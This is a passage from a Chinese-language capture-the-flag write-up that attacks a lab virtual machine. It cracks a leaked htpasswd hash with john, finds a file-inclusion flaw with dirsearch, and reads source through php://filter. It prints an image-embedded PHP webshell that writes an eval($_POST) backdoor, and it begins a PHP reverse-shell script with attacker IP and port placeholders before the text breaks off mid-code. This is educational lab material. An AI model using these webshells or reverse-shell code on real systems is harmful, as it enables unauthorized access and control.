file to protect the development path <span class="token operator">--</span><span class="token operator">></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></pre></td></tr></table></figure><p>这里发现了一个密码泄露，很可能是之前认证页面的密码。</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">frank</span><span class="token operator">:</span>$apr1$1oIGDEDK$<span class="token operator">/</span>aVFPluYt56UvslZMBDoC0</pre></td></tr></table></figure><p>使用 <code>touch命令</code> 创建一个 <code>passwd.txt</code> 文件，将其保存到里面，然后使用 <code>john</code> 进行爆破：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Created directory<span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">root</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>john</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> detected hash type <span class="token string">"md5crypt"</span><span class="token punctuation">,</span> but the string is also recognized <span class="token keyword">as</span> <span class="token string">"md5crypt-long"</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Use the <span class="token string">"--format=md5crypt-long"</span> option to force loading these <span class="token keyword">as</span> that type instead</pre></td></tr><tr><td data-num="4"></td><td><pre>Using <span class="token keyword">default</span> input encoding<span class="token operator">:</span> <span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span></pre></td></tr><tr><td data-num="5"></td><td><pre>Loaded <span class="token number">1</span> password <span class="token function">hash</span> <span class="token punctuation">(</span>md5crypt<span class="token punctuation">,</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token function">$1$</span> <span class="token punctuation">(</span>and variants<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token constant">MD5</span> <span class="token number">128</span><span class="token operator">/</span><span class="token number">128</span> <span class="token constant">AVX</span> 4x3<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Will run <span class="token number">2</span> OpenMP threads</pre></td></tr><tr><td data-num="7"></td><td><pre>Proceeding <span class="token keyword">with</span> single<span class="token punctuation">,</span> <span class="token literal-property property">rules</span><span class="token operator">:</span>Single</pre></td></tr><tr><td data-num="8"></td><td><pre>Press <span class="token string">'q'</span> or Ctrl<span class="token operator">-</span><span class="token constant">C</span> to abort<span class="token punctuation">,</span> almost any other key <span class="token keyword">for</span> status</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt<span class="token punctuation">,</span> minimum <span class="token number">24</span> needed <span class="token keyword">for</span> performance<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> Only <span class="token number">20</span> candidates buffered <span class="token keyword">for</span> the current salt<span class="token punctuation">,</span> minimum <span class="token number">24</span> needed <span class="token keyword">for</span> performance<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="11"></td><td><pre>frank<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>         <span class="token punctuation">(</span>frank<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>1g <span class="token number">0</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">DONE</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">3</span> <span class="token punctuation">(</span><span class="token number">2021</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">57</span><span class="token punctuation">)</span> <span class="token number">33</span><span class="token punctuation">.</span>33g<span class="token operator">/</span>s 6333p<span class="token operator">/</span>s 6333c<span class="token operator">/</span>s 6333C<span class="token operator">/</span>s <span class="token constant">FRANK1</span><span class="token punctuation">.</span><span class="token punctuation">.</span>fr4nk</pre></td></tr><tr><td data-num="13"></td><td><pre>Use the <span class="token string">"--show"</span> option to display all <span class="token keyword">of</span> the cracked passwords reliably</pre></td></tr><tr><td data-num="14"></td><td><pre>Session completed</pre></td></tr></table></figure><p>成功破解出密码为 <code>frank!!!</code> ，尝试登录：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180913173-457889153.png" alt="image"></p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">*</span> Here is my unfinished tools list</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span> the uploader <span class="token function">tool</span> <span class="token punctuation">(</span>finished but need security review<span class="token punctuation">)</span></pre></td></tr></table></figure><p>这次终于没有失败，我们成功进来了，而且在页面还发现提示，这里存在一个上传位置，我们尝试访问 <code>/uploader</code> ：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180936496-1976919466.png" alt="image"></p><p>得到一个文件上传页面 yeyeye！</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181023735-276335209.png" alt="image"></p><p>这里尝试几种绕过方式都没有成功，只能上传图片了，如果网站同时存在文件包含漏洞，那么我们就可以直接将上传的图片解析成 <code>php</code> 。</p><p>记得之前端口扫描时我们还发现存在 <code>8011端口</code> 也是 <code>http服务</code> ，我们先去看一看有没有可以利用的地方：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181056264-728944616.png" alt="image"></p><p>没有太多的东西，同样我们也对这个目录进行扫描：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181107502-363517423.png" alt="image"></p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>_<span class="token operator">|</span><span class="token punctuation">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0<span class="token punctuation">.</span><span class="token number">4.2</span>                                           </pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">/</span><span class="token function">_</span><span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                    </pre></td></tr><tr><td data-num="3"></td><td><pre>                                                                           </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token literal-property property">Extensions</span><span class="token operator">:</span> php<span class="token punctuation">,</span> aspx<span class="token punctuation">,</span> jsp<span class="token punctuation">,</span> html<span class="token punctuation">,</span> js <span class="token operator">|</span> <span class="token constant">HTTP</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token constant">GET</span> <span class="token operator">|</span> Threads<span class="token operator">:</span> <span class="token number">30</span> <span class="token operator">|</span> Wordlist size<span class="token operator">:</span> <span class="token number">10929</span>                                                          </pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>Output File<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>reports<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">-</span><span class="token number">8011</span><span class="token operator">/</span><span class="token operator">-</span>_21<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_05</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>Error Log<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>logs<span class="token operator">/</span>errors<span class="token operator">-</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_05</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">.</span>log</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">Target</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">192.168.56.118:8011</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">]</span> Starting<span class="token operator">:</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  308B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>ht_wsr<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>bak1</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  300B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>sample</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_sc</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_orig</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessBAK</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>save</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  299B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_extra</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>orig</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  297B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD2</pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  288B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htm</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  289B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswds</pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>httr<span class="token operator">-</span>oauth</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswd_test</pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>  351B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">api</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  321B  <span class="token operator">-</span> <span class="token operator">/</span>api  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">:</span><span class="token number">8011</span><span class="token operator">/</span>api<span class="token operator">/</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">45</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  308B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">cgi-bin</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">51</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>   30B  <span class="token operator">-</span> <span class="token operator">/</span>index<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">00</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  297B  <span class="token operator">-</span> <span class="token operator">/</span>server<span class="token operator">-</span>status</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">00</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">server-status</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>Task Completed</pre></td></tr></table></figure><p>这里发现一个 <code>api接口</code> ，我们进去看一下：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181126088-570887979.png" alt="image"></p><p>尝试几波发现只有 <code>files_api.php</code> 可以进去：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181150189-227701744.png" alt="image"></p><p>页面报错信息提示需要一个 <code>file参数</code> ，发现通过 <code>post方式</code> 可以进行文件包含：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181214185-1584981500.png" alt="image"></p><h2 id="漏洞利用"><a class="anchor" href="#漏洞利用">#</a> 漏洞利用</h2><p>上传一个图片马：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181228364-2120044844.png" alt="image"></p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'ant.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[ant]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><p>成功上传图片马，但是我们发现这里并没有发现图片上传的路径，我们尝试用 <code>8011</code> 的 <code>api接口</code> 包含上传功能页面，看看能否找到上传的路径信息， <code>apache</code> 的网站目录一般会放在 <code>/var/www/html</code> 下，这里尝试几次后发现它的网站根目录在 <code>/var/www</code> 下，因为这里是文件包含，不能读取文件的源码，我们使用 <code>php伪协议</code> 读取源码：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>file<span class="token operator">=</span>php<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>development<span class="token operator">/</span>uploader<span class="token operator">/</span>upload<span class="token punctuation">.</span>php</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181324401-211109321.png" alt="image"></p><p>成功读取到 <code>base64编码</code> 后的源码，使用 <code>bp解码</code> ：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181346917-902307267.png" alt="image"></p><p>我们成功发现了上传路径为 <code>FRANKuploads/</code> 。</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181404437-1636524063.png" alt="image"></p><p>尝试写入包含图片的 <code>webshell</code> ，but 写入失败了，可能是权限的问题 az.</p><p>我们换个 <code>webshell</code> 试一下：</p><p>方法一，使用如下 <code>php马</code> ：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">function</span> <span class="token function">which</span><span class="token punctuation">(</span><span class="token parameter">$pr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="3"></td><td><pre>$path <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token string">"which $pr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">return</span> <span class="token punctuation">(</span>$path <span class="token operator">?</span> $path <span class="token operator">:</span> $pr<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token parameter">$cfe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="7"></td><td><pre>$res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="10"></td><td><pre>@<span class="token function">exec</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">,</span>$res<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="11"></td><td><pre>$res <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>$res<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="13"></td><td><pre>$res <span class="token operator">=</span> @<span class="token function">shell_exec</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="15"></td><td><pre>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="16"></td><td><pre>@<span class="token function">system</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="17"></td><td><pre>$res <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="18"></td><td><pre>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="20"></td><td><pre>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="21"></td><td><pre>@<span class="token function">passthru</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="22"></td><td><pre>$res <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="23"></td><td><pre>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span>@<span class="token function">is_resource</span><span class="token punctuation">(</span>$f <span class="token operator">=</span> @<span class="token function">popen</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="25"></td><td><pre>$res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span>$f<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="27"></td><td><pre>$res <span class="token punctuation">.</span><span class="token operator">=</span> @<span class="token function">fread</span><span class="token punctuation">(</span>$f<span class="token punctuation">,</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="29"></td><td><pre>@<span class="token function">pclose</span><span class="token punctuation">(</span>$f<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">return</span> $res<span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">function</span> <span class="token function">cf</span><span class="token punctuation">(</span><span class="token parameter">$fname<span class="token punctuation">,</span>$text</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>$fp<span class="token operator">=</span>@<span class="token function">fopen</span><span class="token punctuation">(</span>$fname<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="36"></td><td><pre>@<span class="token function">fputs</span><span class="token punctuation">(</span>$fp<span class="token punctuation">,</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span>$text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="37"></td><td><pre>@<span class="token function">fclose</span><span class="token punctuation">(</span>$fp<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="40"></td><td><pre>$yourip <span class="token operator">=</span> <span class="token string">"your IP"</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="41"></td><td><pre>$yourport <span class="token operator">=</span> <span class="token string">'your port'</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="42"></td><td><pre>$usedb <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'perl'</span><span class="token operator">=></span><span class="token string">'perl'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">=></span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="43"></td><td><pre>$back_connect<span class="token operator">=</span><span class="token 